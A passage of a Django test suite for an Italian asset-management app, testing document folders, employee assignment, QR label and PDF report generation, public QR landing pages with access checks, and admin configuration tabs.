        with _workspace_temporary_directory("assets-grouping-") as tmpdir, override_settings(MEDIA_ROOT=Path(tmpdir)):
            AssetDocument.objects.create(
                asset=asset,
                category=AssetDocument.CATEGORY_INTERVENTI,
                file=SimpleUploadedFile("loose.pdf", b"%PDF-1.4 test", content_type="application/pdf"),
                original_name="loose.pdf",
            )
            AssetDocument.objects.create(
                asset=asset,
                category=AssetDocument.CATEGORY_INTERVENTI,
                file=SimpleUploadedFile("foto-01.jpg", b"binarydata", content_type="image/jpeg"),
                original_name="foto-01.jpg",
                relative_folder="Intervento maggio/Foto",
            )
            AssetDocument.objects.create(
                asset=asset,
                category=AssetDocument.CATEGORY_INTERVENTI,
                file=SimpleUploadedFile("foto-02.jpg", b"binarydata", content_type="image/jpeg"),
                original_name="foto-02.jpg",
                relative_folder="Intervento maggio/Foto",
            )
            _labels, grouped = asset_views._build_asset_documents_by_category(asset)

        groups = grouped[AssetDocument.CATEGORY_INTERVENTI]
        # Primo gruppo: file singoli (folder vuoto); poi un gruppo per la cartella.
        self.assertEqual(groups[0]["folder"], "")
        self.assertEqual(len(groups[0]["documents"]), 1)
        self.assertEqual(groups[1]["folder"], "Intervento maggio/Foto")
        self.assertEqual(len(groups[1]["documents"]), 2)

    def test_document_folder_specs_include_category_extra_folders(self):
        """Le cartelle documento extra della AssetCategory si aggiungono alle 3 di base."""
        category = AssetCategory.objects.create(code="cnc-spec", label="CNC", is_active=True)
        asset = Asset.objects.create(
            name="Centro specs cartelle",
            asset_type=Asset.TYPE_WORK_MACHINE,
            asset_category=category,
            reparto="CN5",
            source_key="manual-wm-folder-specs",
        )
        AssetCategoryDocumentFolder.objects.create(category=category, name="Collaudi", slug="collaudi", order=1)
        AssetCategoryDocumentFolder.objects.create(
            category=category, name="Disattivata", slug="disattivata", order=2, is_active=False
        )

        codes = [spec["code"] for spec in asset_views._asset_document_folder_specs(asset)]
        self.assertEqual(codes[:3], ["SPECIFICHE", "INTERVENTI", "MANUALI"])
        self.assertIn("collaudi", codes)
        # La cartella disattivata non compare tra quelle disponibili.
        self.assertNotIn("disattivata", codes)

    def test_add_asset_document_folder_requires_manager(self):
        """Un utente non gestore non puo aggiungere cartelle documento."""
        category = AssetCategory.objects.create(code="cnc-add-perm", label="CNC", is_active=True)
        asset = Asset.objects.create(
            name="Centro add perm",
            asset_type=Asset.TYPE_WORK_MACHINE,
            asset_category=category,
            reparto="CN5",
            source_key="manual-wm-add-perm",
        )
        self.client.force_login(self.user)
        response = self.client.post(
            reverse("assets:asset_view", args=[asset.id]),
            {"action": "add_asset_document_folder", "folder_name": "Collaudi"},
        )
        self.assertEqual(response.status_code, 302)
        self.assertFalse(category.document_folders.exists())

    def test_add_and_deactivate_asset_document_folder(self):
        """Un gestore aggiunge una cartella e la disattiva solo se vuota."""
        admin = User.objects.create_superuser(
            username="asset-doc-folder-admin",
            email="asset-doc-folder-admin@test.local",
            password="pass12345",
        )
        category = AssetCategory.objects.create(code="cnc-add", label="CNC", is_active=True)
        asset = Asset.objects.create(
            name="Centro add cartella",
            asset_type=Asset.TYPE_WORK_MACHINE,
            asset_category=category,
            reparto="CN5",
            source_key="manual-wm-add-folder",
        )
        self.client.force_login(admin)

        self.client.post(
            reverse("assets:asset_view", args=[asset.id]),
            {"action": "add_asset_document_folder", "folder_name": "Collaudi qualità"},
        )
        folder = category.document_folders.get()
        self.assertEqual(folder.slug, "collaudi-qualita")
        self.assertTrue(folder.is_active)

        # Cartella con un documento: la disattivazione viene bloccata.
        with _workspace_temporary_directory("assets-folder-deact-") as tmpdir, override_settings(MEDIA_ROOT=Path(tmpdir)):
            document = AssetDocument.objects.create(
                asset=asset,
                category=folder.slug,
                file=SimpleUploadedFile("collaudo.pdf", b"%PDF-1.4 test", content_type="application/pdf"),
                original_name="collaudo.pdf",
            )
            self.client.post(
                reverse("assets:asset_view", args=[asset.id]),
                {"action": "deactivate_asset_document_folder", "folder_id": folder.id},
            )
            folder.refresh_from_db()
            self.assertTrue(folder.is_active)

            # Svuotata la cartella, la disattivazione va a buon fine.
            document.delete()
            self.client.post(
                reverse("assets:asset_view", args=[asset.id]),
                {"action": "deactivate_asset_document_folder", "folder_id": folder.id},
            )
            folder.refresh_from_db()
            self.assertFalse(folder.is_active)

    def test_asset_edit_assignment_from_anagrafica_autofills_department_and_location(self):
        self.client.force_login(self.user)
        legacy_user = UtenteLegacy.objects.create(
            nome="Bova Luca",
            email="l.bova@example.local",
            password="x",
            attivo=True,
        )
        anagrafica = AnagraficaDipendente.objects.create(
            nome="Luca",
            cognome="Bova",
            reparto="CED",
            mansione="IT",
            email="l.bova@example.local",
            email_notifica="l.bova@example.com",
            utente=legacy_user,
        )
        asset = Asset.objects.create(
            asset_tag="IT-AUTOASSIGN",
            name="Firewall assegnazione",
            asset_type=Asset.TYPE_FIREWALL,
            reparto="CED",
            status=Asset.STATUS_IN_USE,
            source_key="asset-autoassign",
        )

        response = self.client.post(
            reverse("assets:asset_edit", args=[asset.id]),
            {
                "asset_tag": asset.asset_tag,
                "name": asset.name,
                "asset_type": asset.asset_type,
                "reparto": asset.reparto,
                "manufacturer": "",
                "model": "M270",
                "serial_number": "FW-1",
                "status": Asset.STATUS_IN_USE,
                "assignment_mode": "employee",
                "assignment_employee_id": str(anagrafica.id),
                "assignment_to": "",
                "assignment_reparto": "",
                "assignment_location": "",
                "notes": "",
            },
        )
        self.assertEqual(response.status_code, 302)
        asset.refresh_from_db()
        self.assertEqual(asset.assignment_to, "Bova Luca")
        self.assertEqual(asset.assignment_reparto, "CED")
        self.assertEqual(asset.assignment_location, "CED")
        self.assertEqual(asset.assigned_legacy_user_id, legacy_user.id)

    def test_asset_assignment_payload_does_not_expose_employee_email(self):
        self.client.force_login(self.user)
        legacy_user = UtenteLegacy.objects.create(
            nome="Privacy Test",
            email="privacy@example.local",
            password="x",
            attivo=True,
        )
        AnagraficaDipendente.objects.create(
            nome="Privacy",
            cognome="Test",
            reparto="CED",
            mansione="IT",
            email="privacy@example.local",
            email_notifica="privacy@example.com",
            utente=legacy_user,
        )
        asset = Asset.objects.create(
            asset_tag="IT-PRIVACY",
            name="Asset privacy",
            asset_type=Asset.TYPE_FIREWALL,
            reparto="CED",
            status=Asset.STATUS_IN_USE,
            source_key="asset-privacy",
        )

        response = self.client.get(reverse("assets:asset_edit", args=[asset.id]))

        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "Test Privacy")
        self.assertNotContains(response, "privacy@example.local")
        self.assertNotContains(response, "privacy@example.com")

    def test_asset_edit_rejects_unknown_assignment_employee_id(self):
        self.client.force_login(self.user)
        asset = Asset.objects.create(
            asset_tag="IT-BADASSIGN",
            name="Firewall assegnazione invalida",
            asset_type=Asset.TYPE_FIREWALL,
            reparto="CED",
            status=Asset.STATUS_IN_USE,
            source_key="asset-badassign",
        )

        response = self.client.post(
            reverse("assets:asset_edit", args=[asset.id]),
            {
                "asset_tag": asset.asset_tag,
                "name": asset.name,
                "asset_type": asset.asset_type,
                "reparto": asset.reparto,
                "manufacturer": "",
                "model": "",
                "serial_number": "",
                "status": Asset.STATUS_IN_USE,
                "assignment_mode": "employee",
                "assignment_employee_id": "999999",
                "assignment_to": "",
                "assignment_reparto": "",
                "assignment_location": "",
                "notes": "",
            },
        )

        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "Seleziona un dipendente valido dall&#x27;anagrafica.")
        asset.refresh_from_db()
        self.assertEqual(asset.assigned_legacy_user_id, None)
        self.assertEqual(asset.assignment_to, "")

    def test_asset_edit_rejects_department_assignment_without_department(self):
        self.client.force_login(self.user)
        legacy_user = UtenteLegacy.objects.create(
            nome="Mario Rossi",
            email="m.rossi@example.local",
            password="x",
            attivo=True,
        )
        asset = Asset.objects.create(
            asset_tag="IT-DEPTEMPTY",
            name="Asset reparto vuoto",
            asset_type=Asset.TYPE_FIREWALL,
            reparto="CED",
            status=Asset.STATUS_IN_USE,
            assigned_legacy_user_id=legacy_user.id,
            assignment_to="Mario Rossi",
            assignment_reparto="CED",
            source_key="asset-dept-empty",
        )

        response = self.client.post(
            reverse("assets:asset_edit", args=[asset.id]),
            {
                "asset_tag": asset.asset_tag,
                "name": asset.name,
                "asset_type": asset.asset_type,
                "reparto": asset.reparto,
                "manufacturer": "",
                "model": "",
                "serial_number": "",
                "status": Asset.STATUS_IN_USE,
                "assignment_mode": "department",
                "assignment_employee_id": "",
                "assignment_department_value": "",
                "assignment_to": asset.assignment_to,
                "assignment_reparto": asset.assignment_reparto,
                "assignment_location": "",
                "notes": "",
            },
        )

        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "Indica il reparto da assegnare.")
        asset.refresh_from_db()
        self.assertEqual(asset.assigned_legacy_user_id, legacy_user.id)
        self.assertEqual(asset.assignment_to, "Mario Rossi")

    def test_work_machine_department_assignment_creates_marker(self):
        self.client.force_login(self.user)
        with _workspace_temporary_directory("assets-layout-upload-") as tmpdir:
            with override_settings(MEDIA_ROOT=Path(tmpdir)):
                layout = PlantLayout.objects.create(
                    category="Officina",
                    name="Layout officina",
                    image=_valid_png_upload(),
                    is_active=True,
                )
                response = self.client.post(
                    reverse("assets:work_machine_create"),
                    {
                        "asset_tag": "ML-AUTODEPT",
                        "name": "Totem reparto",
                        "asset_category": "",
                        "reparto": "CN5",
                        "manufacturer": "",
                        "model": "",
                        "serial_number": "TOTEM-1",
                        "status": Asset.STATUS_IN_USE,
                        "assignment_mode": "department",
                        "assignment_employee_id": "",
                        "assignment_department_value": "CN5",
                        "assignment_to": "",
                        "assignment_reparto": "",
                        "assignment_location": "",
                        "include_in_plant_layout": "on",
                        "notes": "",
                        "documents_specs_payload": json.dumps([]),
                        "documents_manuals_payload": json.dumps([]),
                        "documents_interventions_payload": json.dumps([]),
                    },
                )
        self.assertEqual(response.status_code, 302)
        asset = Asset.objects.get(asset_tag="ML-AUTODEPT")
        self.assertEqual(asset.assignment_to, "Reparto CN5")
        self.assertEqual(asset.assignment_reparto, "CN5")
        self.assertEqual(asset.assignment_location, "CN5")
        self.assertTrue(PlantLayoutMarker.objects.filter(layout=layout, asset=asset, is_visible=True).exists())

    def test_asset_detail_shows_qr_label_action(self):
        asset = Asset.objects.create(
            name="Centro documentato",
            asset_type=Asset.TYPE_WORK_MACHINE,
            reparto="CN5",
            source_key="manual-wm-qr-detail",
        )
        WorkMachine.objects.create(asset=asset, source_key="manual-wm-qr-detail")
        self.client.force_login(self.user)
        response = self.client.get(reverse("assets:asset_view", kwargs={"id": asset.id}))
        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "Apri etichetta QR")

    def test_asset_detail_shows_report_pdf_button(self):
        asset = Asset.objects.create(
            name="Macchina report",
            asset_type=Asset.TYPE_WORK_MACHINE,
            reparto="CN5",
            source_key="manual-wm-report-button",
        )
        WorkMachine.objects.create(asset=asset, source_key="manual-wm-report-button")
        self.client.force_login(self.user)

        response = self.client.get(reverse("assets:asset_view", kwargs={"id": asset.id}))

        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "Report PDF")
        self.assertContains(response, reverse("assets:asset_report_pdf", kwargs={"id": asset.id}))

    def test_asset_report_pdf_returns_pdf(self):
        asset = Asset.objects.create(
            name="Macchina report PDF",
            asset_type=Asset.TYPE_WORK_MACHINE,
            reparto="CN5",
            source_key="manual-wm-report-pdf",
            manufacturer="DMG",
            model="CMX 70",
        )
        WorkMachine.objects.create(
            asset=asset,
            source_key="manual-wm-report-pdf",
            year=2024,
            cnc_controlled=True,
            next_maintenance_date=date(2026, 4, 15),
        )
        self.client.force_login(self.user)

        response = self.client.get(reverse("assets:asset_report_pdf", kwargs={"id": asset.id}))

        self.assertEqual(response.status_code, 200)
        self.assertEqual(response["Content-Type"], "application/pdf")
        self.assertTrue(response.content.startswith(b"%PDF"))

    def test_asset_report_pdf_skips_template_query_when_table_is_unavailable(self):
        asset = Asset.objects.create(
            name="Macchina report senza template",
            asset_type=Asset.TYPE_WORK_MACHINE,
            reparto="CN5",
            source_key="manual-wm-report-no-template-table",
        )
        WorkMachine.objects.create(asset=asset, source_key="manual-wm-report-no-template-table")
        self.client.force_login(self.user)

        with patch(
            "assets.views._model_table_exists",
            side_effect=lambda model: False if model is AssetReportTemplate else True,
        ):
            with patch.object(
                AssetReportTemplate.objects,
                "filter",
                side_effect=AssertionError("AssetReportTemplate query should not run"),
            ):
                response = self.client.get(reverse("assets:asset_report_pdf", kwargs={"id": asset.id}))

        self.assertEqual(response.status_code, 200)
        self.assertEqual(response["Content-Type"], "application/pdf")
        self.assertTrue(response.content.startswith(b"%PDF"))

    def test_asset_report_snapshot_includes_part_145(self):
        from assets.views import _build_asset_report_snapshot

        asset = Asset.objects.create(asset_tag="AST-P145-RPT", name="Aeromobile Report", part_145=True)
        snapshot = _build_asset_report_snapshot(asset)
        self.assertIn(("PART 145", "Sì"), snapshot["summary_rows"])

    def test_asset_report_pdf_renders_for_part_145_asset(self):
        # Il report riscritto col template standard (platypus) deve generare un PDF
        # valido anche col banner PART 145 in evidenza.
        self.client.force_login(self.user)
        asset = Asset.objects.create(asset_tag="AST-P145-RPT2", name="Vasca PART 145", part_145=True)
        response = self.client.get(reverse("assets:asset_report_pdf", kwargs={"id": asset.id}))
        self.assertEqual(response.status_code, 200)
        self.assertEqual(response["Content-Type"], "application/pdf")
        self.assertTrue(response.content.startswith(b"%PDF"))

    def test_asset_qr_label_returns_pdf(self):
        asset = Asset.objects.create(
            name="Macchina QR",
            asset_type=Asset.TYPE_WORK_MACHINE,
            reparto="CNC",
            source_key="manual-wm-qr",
        )
        WorkMachine.objects.create(asset=asset, source_key="manual-wm-qr")
        AssetLabelTemplate.objects.update_or_create(
            code="default",
            defaults={
                "show_logo": True,
                "logo_height_mm": 10,
                "logo_alignment": AssetLabelTemplate.LOGO_ALIGNMENT_LEFT,
            },
        )
        self.client.force_login(self.user)
        response = self.client.get(reverse("assets:asset_qr_label", kwargs={"id": asset.id}))
        self.assertEqual(response.status_code, 200)
        self.assertEqual(response["Content-Type"], "application/pdf")
        self.assertTrue(response.content.startswith(b"%PDF"))

    @override_settings(SITE_URL="https://hub.cnovicrom.local")
    def test_asset_qr_label_uses_site_url_for_public_route(self):
        asset = Asset.objects.create(
            name="Macchina QR HTTPS",
            asset_type=Asset.TYPE_WORK_MACHINE,
            reparto="CNC",
            source_key="manual-wm-qr-https",
        )
        WorkMachine.objects.create(asset=asset, source_key="manual-wm-qr-https")
        self.client.force_login(self.user)

        with patch("assets.views._draw_asset_label_pdf") as draw_label:
            response = self.client.get(reverse("assets:asset_qr_label", kwargs={"id": asset.id}))

        self.assertEqual(response.status_code, 200)
        self.assertEqual(
            draw_label.call_args.kwargs["target_url"],
            f"https://hub.cnovicrom.local{reverse('assets:asset_qr_public_landing', kwargs={'public_qr_token': asset.public_qr_token})}",
        )

    def test_asset_qr_label_points_to_public_landing(self):
        asset = Asset.objects.create(
            name="Macchina QR no public",
            asset_type=Asset.TYPE_WORK_MACHINE,
            reparto="CNC",
            source_key="manual-wm-qr-no-public",
        )
        WorkMachine.objects.create(asset=asset, source_key="manual-wm-qr-no-public")
        self.client.force_login(self.user)

        with patch("assets.views._draw_asset_label_pdf") as draw_label:
            response = self.client.get(reverse("assets:asset_qr_label", kwargs={"id": asset.id}))

        self.assertEqual(response.status_code, 200)
        # Il QR non deve mai puntare a una pagina che richiede login: landing pubblica.
        self.assertEqual(
            draw_label.call_args.kwargs["target_url"],
            response.wsgi_request.build_absolute_uri(
                reverse("assets:asset_qr_public_landing", kwargs={"public_qr_token": asset.public_qr_token})
            ),
        )
        self.assertEqual(draw_label.call_args.kwargs["target_label"], "Landing QR pubblica")

    def test_asset_qr_public_landing_is_readable_without_login(self):
        asset = Asset.objects.create(
            asset_tag="AST-QR-PUB",
            name="Macchina QR pubblica",
            asset_type=Asset.TYPE_WORK_MACHINE,
            reparto="CNC",
            source_key="manual-wm-qr-public-landing",
        )

        response = self.client.get(
            reverse("assets:asset_qr_public_landing", kwargs={"public_qr_token": asset.public_qr_token})
        )

        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "AST-QR-PUB")
        self.assertContains(response, "Interventi aperti")
        # I documenti sono visibili anche dal QR pubblico (funzione voluta): il token
        # e' la chiave d'accesso, i file non sono mai serviti da /media/.
        self.assertContains(response, "Documenti")
        self.assertNotContains(response, "/media/assets_documents/")
        # Nessuna shell applicativa e nessun link alla scheda interna per il visitatore anonimo.
        self.assertNotContains(response, reverse("assets:asset_view", kwargs={"id": asset.id}))
        # L'apertura della segnalazione resta dietro login.
        self.assertContains(response, "Accedi e segnala un problema")

    def test_asset_qr_public_landing_unknown_or_disabled_token_404(self):
        asset = Asset.objects.create(
            asset_tag="AST-QR-PUB-OFF",
            name="Macchina QR disattivata",
            source_key="manual-wm-qr-public-off",
        )
        token = asset.public_qr_token
        Asset.objects.filter(pk=asset.pk).update(public_qr_enabled=False)

        disabled = self.client.get(reverse("assets:asset_qr_public_landing", kwargs={"public_qr_token": token}))
        unknown = self.client.get(reverse("assets:asset_qr_public_landing", kwargs={"public_qr_token": "missing"}))

        self.assertEqual(disabled.status_code, 404)
        self.assertEqual(unknown.status_code, 404)

    def test_asset_qr_landing_by_tag_still_requires_login(self):
        asset = Asset.objects.create(
            asset_tag="AST-QR-INT",
            name="Macchina QR interna",
            source_key="manual-wm-qr-internal-landing",
        )

        response = self.client.get(reverse("assets:asset_qr_landing", kwargs={"asset_tag": asset.asset_tag}))

        self.assertEqual(response.status_code, 302)
        self.assertIn(reverse("login"), response["Location"])

    def test_asset_qr_label_detail_target_still_points_to_asset_detail(self):
        asset = Asset.objects.create(
            name="Macchina QR dettaglio",
            asset_type=Asset.TYPE_WORK_MACHINE,
            reparto="CNC",
            source_key="manual-wm-qr-detail",
        )
        WorkMachine.objects.create(asset=asset, source_key="manual-wm-qr-detail")
        self.client.force_login(self.user)

        with patch("assets.views._draw_asset_label_pdf") as draw_label:
            response = self.client.get(f"{reverse('assets:asset_qr_label', kwargs={'id': asset.id})}?target=detail")

        self.assertEqual(response.status_code, 200)
        self.assertEqual(
            draw_label.call_args.kwargs["target_url"],
            response.wsgi_request.build_absolute_uri(reverse("assets:asset_view", kwargs={"id": asset.id})),
        )
        self.assertEqual(draw_label.call_args.kwargs["target_label"], "Scheda asset")

    def test_non_admin_cannot_open_asset_label_designer(self):
        self.client.force_login(self.user)
        response = self.client.get(reverse("assets:asset_label_designer"))
        self.assertEqual(response.status_code, 302)
        self.assertRedirects(response, reverse("assets:asset_list"))

    def test_superuser_can_open_asset_label_designer(self):
        admin = User.objects.create_superuser(
            username="asset-label-admin",
            email="asset-label-admin@test.local",
            password="pass12345",
        )
        self.client.force_login(admin)
        response = self.client.get(reverse("assets:asset_label_designer"))
        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "Designer etichetta QR")
        self.assertTrue(AssetLabelTemplate.objects.filter(code="default").exists())

    def test_superuser_can_save_asset_label_template(self):
        admin = User.objects.create_superuser(
            username="asset-label-save-admin",
            email="asset-label-save-admin@test.local",
            password="pass12345",
        )
        asset = Asset.objects.create(
            name="Centro prova label",
            asset_type=Asset.TYPE_WORK_MACHINE,
            reparto="CN5",
            source_key="manual-wm-label-template",
        )
        WorkMachine.objects.create(asset=asset, source_key="manual-wm-label-template", year=2023, cnc_controlled=True)
        self.client.force_login(admin)
        response = self.client.post(reverse("assets:asset_label_designer"), _label_template_payload(preview_asset_id=asset.id))
        self.assertEqual(response.status_code, 302)
        template = AssetLabelTemplate.objects.get(code="default")
        self.assertEqual(template.name, "Layout officina")
        self.assertEqual(template.qr_position, "LEFT")
        self.assertEqual(template.page_width_mm, 110)
        self.assertEqual(template.page_height_mm, 70)
        self.assertTrue(template.show_logo)
        self.assertEqual(template.logo_alignment, "CENTER")
        self.assertEqual(template.body_fields, ["asset_type", "reparto", "year", "cnc_controlled"])

    def test_resolve_asset_label_template_prefers_asset_override_then_type_then_default(self):
        asset = Asset.objects.create(
            name="Macchina priorita template",
            asset_type=Asset.TYPE_WORK_MACHINE,
            reparto="CN5",
            source_key="manual-wm-template-priority",
        )
        default_template = asset_views._get_default_asset_label_template()
        default_template.name = "Template generale"
        default_template.save()

        resolved = asset_views._resolve_asset_label_template(asset)
        self.assertEqual(resolved.pk, default_template.pk)

        type_template = AssetLabelTemplate.objects.create(
            asset_type=Asset.TYPE_WORK_MACHINE,
            name="Template tipologia",
        )
        resolved = asset_views._resolve_asset_label_template(asset)
        self.assertEqual(resolved.pk, type_template.pk)

        asset_template = AssetLabelTemplate.objects.create(asset=asset, name="Template personale")
        resolved = asset_views._resolve_asset_label_template(asset)
        self.assertEqual(resolved.pk, asset_template.pk)

    def test_superuser_can_save_asset_type_label_template(self):
        admin = User.objects.create_superuser(
            username="asset-label-type-admin",
            email="asset-label-type-admin@test.local",
            password="pass12345",
        )
        asset = Asset.objects.create(
            name="Centro per template tipologia",
            asset_type=Asset.TYPE_WORK_MACHINE,
            reparto="CN5",
            source_key="manual-wm-label-type-template",
        )
        WorkMachine.objects.create(asset=asset, source_key="manual-wm-label-type-template", year=2024, cnc_controlled=True)
        self.client.force_login(admin)
        response = self.client.post(
            reverse("assets:asset_label_designer"),
            _label_template_payload(
                preview_asset_id=asset.id,
                scope=AssetLabelTemplate.SCOPE_ASSET_TYPE,
                scope_asset_type=Asset.TYPE_WORK_MACHINE,
                name="Template tipologia officina",
            ),
        )
        self.assertEqual(response.status_code, 302)
        template = AssetLabelTemplate.objects.get(
            scope=AssetLabelTemplate.SCOPE_ASSET_TYPE,
            asset_type=Asset.TYPE_WORK_MACHINE,
        )
        self.assertEqual(template.code, "type-work_machine")
        self.assertIsNone(template.asset)
        self.assertEqual(template.name, "Template tipologia officina")

    def test_superuser_can_save_asset_specific_label_template(self):
        admin = User.objects.create_superuser(
            username="asset-label-asset-admin",
            email="asset-label-asset-admin@test.local",
            password="pass12345",
        )
        asset = Asset.objects.create(
            name="Centro per override asset",
            asset_type=Asset.TYPE_WORK_MACHINE,
            reparto="CN5",
            source_key="manual-wm-label-asset-template",
        )
        WorkMachine.objects.create(asset=asset, source_key="manual-wm-label-asset-template", year=2025, cnc_controlled=True)
        self.client.force_login(admin)
        response = self.client.post(
            reverse("assets:asset_label_designer"),
            _label_template_payload(
                preview_asset_id=asset.id,
                scope=AssetLabelTemplate.SCOPE_ASSET,
                scope_asset_id=str(asset.id),
                name="Override macchina 1",
            ),
        )
        self.assertEqual(response.status_code, 302)
        template = AssetLabelTemplate.objects.get(
            scope=AssetLabelTemplate.SCOPE_ASSET,
            asset=asset,
        )
        self.assertEqual(template.code, f"asset-{asset.id}")
        self.assertEqual(template.name, "Override macchina 1")
        self.assertEqual(asset_views._resolve_asset_label_template(asset).pk, template.pk)

    def test_superuser_can_upload_custom_logo_for_asset_label_template(self):
        admin = User.objects.create_superuser(
            username="asset-label-logo-admin",
            email="asset-label-logo-admin@test.local",
            password="pass12345",
        )
        png_logo = SimpleUploadedFile(
            "logo.png",
            (
                b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89"
                b"\x00\x00\x00\rIDATx\x9cc\xf8\xff\xff?\x00\x05\xfe\x02\xfeA\x8d\xb1\x87\x00\x00\x00\x00IEND\xaeB`\x82"
            ),
            content_type="image/png",
        )
        self.client.force_login(admin)
        with _workspace_temporary_directory("assets-label-logo-") as tmpdir:
            with override_settings(MEDIA_ROOT=Path(tmpdir)):
                response = self.client.post(
                    reverse("assets:asset_label_designer"),
                    {
                        "name": "Template con logo",
                        "page_width_mm": "100",
                        "page_height_mm": "62",
                        "qr_size_mm": "24",
                        "qr_position": "RIGHT",
                        "show_logo": "on",
                        "logo_height_mm": "10",
                        "logo_alignment": "LEFT",
                        "title_font_size_pt": "16",
                        "body_font_size_pt": "8",
                        "show_border": "on",
                        "border_radius_mm": "4",
                        "show_field_labels": "on",
                        "show_target_label": "on",
                        "show_help_text": "on",
                        "show_target_url": "on",
                        "background_color": "#FFFFFF",
                        "border_color": "#111827",
                        "text_color": "#0F172A",
                        "accent_color": "#1D4ED8",
                        "title_primary_field": "asset_tag",
                        "title_secondary_field": "name",
                        "body_fields_payload": json.dumps(["asset_type", "reparto"]),
                        "logo_file": png_logo,
                    },
                )
                self.assertEqual(response.status_code, 302)
                template = AssetLabelTemplate.objects.get(code="default")
                self.assertTrue(bool(template.logo_file))
                self.assertTrue(Path(template.logo_file.path).exists())

    def test_gestione_admin_shows_label_type_rows_and_overrides(self):
        asset = Asset.objects.create(
            name="Macchina override visibile",
            asset_type=Asset.TYPE_WORK_MACHINE,
            reparto="CN5",
            source_key="manual-wm-config-labels",
        )
        default_template = asset_views._get_default_asset_label_template()
        default_template.name = "Template generale assets"
        default_template.save()
        AssetLabelTemplate.objects.create(asset_type=Asset.TYPE_WORK_MACHINE, name="Template macchine di lavoro")
        AssetLabelTemplate.objects.create(asset=asset, name="Template personale macchina")

        request = self.factory.get(reverse("assets:gestione_admin"), {"tab": "config"})
        _attach_session(request)
        request.user = self.user
        request.legacy_user = None
        setattr(request, "_messages", FallbackStorage(request))

        response = asset_views.gestione_admin.__wrapped__(request)

        self.assertEqual(response.status_code, 200)
        content = response.content.decode("utf-8")
        self.assertIn("Etichette QR stampabili", content)
        self.assertIn("Fallback generale", content)
        self.assertIn("Template generale assets", content)
        self.assertIn("Macchina di lavoro", content)
        self.assertIn("Template macchine di lavoro", content)
        self.assertIn(asset.asset_tag, content)
        self.assertIn("Template personale macchina", content)

    def test_gestione_admin_shows_sidebar_management_card(self):
        AssetSidebarButton.objects.create(
            code="impianti",
            section=AssetSidebarButton.SECTION_MAIN,
            label="Impianti",
            target_url="django:assets:plant_layout_map",
            sort_order=10,
            is_visible=True,
        )

        request = self.factory.get(reverse("assets:gestione_admin"), {"tab": "config"})
        _attach_session(request)
        request.user = self.user
        request.legacy_user = None
        setattr(request, "_messages", FallbackStorage(request))

        response = asset_views.gestione_admin.__wrapped__(request)

        self.assertEqual(response.status_code, 200)
        content = response.content.decode("utf-8")
        # Tab "config": resta la card di riepilogo, con il rimando all'editor.
        self.assertIn("Menu laterale inventario", content)
        self.assertIn("Apri editor sidebar", content)

        # L'editor vero e proprio vive ora nel tab dedicato "sidebar".
        request_editor = self.factory.get(reverse("assets:gestione_admin"), {"tab": "sidebar"})
        _attach_session(request_editor)
        request_editor.user = self.user
        request_editor.legacy_user = None
        setattr(request_editor, "_messages", FallbackStorage(request_editor))

        response_editor = asset_views.gestione_admin.__wrapped__(request_editor)

        self.assertEqual(response_editor.status_code, 200)
        editor = response_editor.content.decode("utf-8")
        self.assertIn("Impianti", editor)
        self.assertIn("assets-sidebar-target-options", editor)
        self.assertIn("assets-sidebar-active-match-options", editor)
        self.assertIn("django:assets:reports", editor)
        self.assertIn("asset_type=SERVER", editor)

    def test_gestione_admin_shows_asset_category_management_tab(self):
        category = AssetCategory.objects.create(
            code="sistema-allarme",
            label="Sistema allarme",
            base_asset_type=Asset.TYPE_OTHER,
            is_active=True,
        )
        Asset.objects.create(
            asset_tag="ALM-001",
            name="Centrale allarme reparto 1",
            asset_type=Asset.TYPE_OTHER,
            asset_category=category,
            status=Asset.STATUS_IN_USE,
            reparto="SIC",
        )
        AssetCategoryField.objects.create(
            category=category,
            code="matricola_centrale",
            label="Matricola centrale",
            field_type=AssetCategoryField.TYPE_TEXT,
            detail_section=AssetDetailField.SECTION_SPECS,
            detail_value_format=AssetDetailField.FORMAT_TEXT,
            show_in_form=True,
            show_in_detail=True,
            is_active=True,
        )

        request = self.factory.get(reverse("assets:gestione_admin"), {"tab": "categorie"})
        _attach_session(request)
        request.user = self.user
        request.legacy_user = None
        setattr(request, "_messages", FallbackStorage(request))

        response = asset_views.gestione_admin.__wrapped__(request)

        self.assertEqual(response.status_code, 200)
        content = response.content.decode("utf-8")
        self.assertIn("Nuova categoria", content)
        self.assertIn("Asset collegati", content)
        self.assertIn(f"asset_category={category.id}", content)
        self.assertIn(f"category-preview-{category.id}", content)
        self.assertIn("Campi dinamici di categoria", content)
        self.assertIn("Sistema allarme", content)
        self.assertIn("Centrale allarme reparto 1", content)
        self.assertIn("Matricola centrale", content)

    def test_gestione_admin_can_create_asset_category_from_categories_tab(self):
        request = self.factory.post(
            reverse("assets:gestione_admin"),
            {
                "action": "create_asset_category",
                "label": "Pompa di calore",
                "base_asset_type": Asset.TYPE_OTHER,
                "description": "Impianto termico",
                "detail_specs_title": "Scheda impianto",
                "sort_order": "15",
                "is_active": "1",
            },
        )
        _attach_session(request)
        request.user = self.user
        request.legacy_user = None
        setattr(request, "_messages", FallbackStorage(request))

        response = asset_views.gestione_admin.__wrapped__(request)

        self.assertEqual(response.status_code, 302)
        self.assertEqual(response["Location"], f"{reverse('assets:gestione_admin')}?tab=categorie")
        self.assertTrue(
            AssetCategory.objects.filter(
                label="Pompa di calore",
                detail_specs_title="Scheda impianto",
            ).exists()
        )

    def test_gestione_admin_can_create_asset_category_field_from_categories_tab(self):
        category = AssetCategory.objects.create(
            code="tvcc",
            label="TVCC",
            base_asset_type=Asset.TYPE_OTHER,
            is_active=True,
        )
        request = self.factory.post(
            reverse("assets:gestione_admin"),
            {
                "action": "create_asset_category_field",
                "category_id": str(category.id),
                "label": "NVR principale",
                "field_type": AssetCategoryField.TYPE_TEXT,
                "detail_section": AssetDetailField.SECTION_SPECS,
                "detail_value_format": AssetDetailField.FORMAT_TEXT,
                "sort_order": "20",
                "show_in_form": "1",
                "show_in_detail": "1",
                "is_active": "1",
            },
        )
        _attach_session(request)
        request.user = self.user
        request.legacy_user = None
        setattr(request, "_messages", FallbackStorage(request))

        response = asset_views.gestione_admin.__wrapped__(request)

